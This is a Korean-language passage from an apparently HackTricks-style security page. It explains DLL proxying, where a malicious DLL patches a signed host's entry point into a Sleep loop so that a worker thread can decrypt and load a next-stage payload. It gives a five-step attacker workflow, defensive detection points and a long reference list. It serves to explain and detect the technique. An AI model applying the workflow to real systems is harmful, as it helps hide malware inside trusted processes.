- 로드된 후 악성 DLL은 호스트의 entry point를 **patch**해, 메인 스레드가 프로세스를 종료시키거나 종료를 유발하는 코드 경로를 실행하는 대신 무한 `Sleep` 루프에 들어가게 합니다.
- 새 스레드가 실제 악성 작업을 수행합니다. 다음 단계 DLL 이름이나 경로를 복호화(RC4/XOR가 흔함)한 다음 `LoadLibrary`로 실행합니다.

중요한 이유
- 일반적인 DLL proxying은 API 호환성을 유지하지만, 이후 단계가 실행될 때까지 호스트가 계속 살아 있을 것이라고 보장하지는 않습니다.
- 메인 스레드를 `Sleep(INFINITE)` 상태로 두는 것은 loader가 worker thread에서 복호화, staging 또는 네트워크 bootstrap을 수행하는 동안 서명된 프로세스를 계속 실행시키는 간단한 방법입니다.
- `DllMain`만 살펴보면, 흥미로운 동작이 호스트 entry point를 patch하고 보조 스레드가 시작된 뒤에 발생하는 이 패턴을 놓칠 수 있습니다.

간단한 워크플로
1. 서명된 호스트 EXE를 복사하고 로컬 디렉터리에서 확인하는 DLL을 알아냅니다.
2. 같은 함수를 export하고 정상 DLL로 전달하는 proxy DLL을 만듭니다.
3. `DllMain(DLL_PROCESS_ATTACH)`에서 worker thread를 생성합니다.
4. 해당 스레드에서 호스트 entry point나 메인 스레드 시작 루틴을 patch해 `Sleep` 루프에 들어가게 합니다.
5. 다음 단계 DLL 이름/설정을 복호화하고 `LoadLibrary`를 호출하거나 payload를 manual-map합니다.

방어 관점의 탐지 지점
- 서명된 프로세스가 `version.dll` 또는 이와 유사한 일반 라이브러리를 `System32` 대신 자체 애플리케이션 디렉터리에서 로드하는 경우.
- 이미지 로드 직후 프로세스 entry point에 메모리 patch가 적용되는 경우. 특히 `Sleep`/`SleepEx`로 분기하거나 호출이 리디렉션되는 경우.
- proxy DLL이 생성한 스레드가 복호화된 이름의 두 번째 DLL에 `LoadLibrary`를 즉시 호출하는 경우.
- `ProgramData`, `%TEMP%` 또는 압축 해제된 아카이브 경로와 같은 쓰기 가능한 staging 디렉터리에서 공급업체 실행 파일 옆에 전체 export를 proxy하는 DLL이 배치된 경우.

## References

- [1] [Red Canary – 2026년 1월 인텔리전스 인사이트](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe를 이용한 권한 상승](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows의 DLL hijacking. 간단한 C 예제.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, 유럽을 표적으로 삼는 새로운 malware 배포](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks와 Windows Helper의 결합](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – 디지털 도플갱어: Gh0st RAT을 배포하는 진화하는 사칭 캠페인의 분석](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 이해관계의 수렴: 동남아시아 정부를 표적으로 삼는 위협 클러스터 분석](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon의 내부: 은밀한 공격 작전의 중계 네트워크와 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom 도구 모음 심층 분석](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack 체인](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – 이란 APT Screening Serpens의 2026년 첩보 캠페인 추적](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 분주한 Nimbus Manticore: 이란 분쟁 중의 작전](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – 작업 동작](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, 동남아시아 정부 및 핵심 인프라 표적화](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0을 사용한 Windows DLL 검색 순서 hijacking 재구성 및 탐지](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOT를 사용한 네이티브 라이브러리 빌드](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOT를 사용한 네이티브 export](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – 동적 링크 라이브러리 검색 순서](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE 형식](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – 정상 소프트웨어에 내장된 SectopRAT 변종 분석](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW 탈취 (1부)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – NetamLoader XAML 기반 .NET 로딩 프레임워크](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
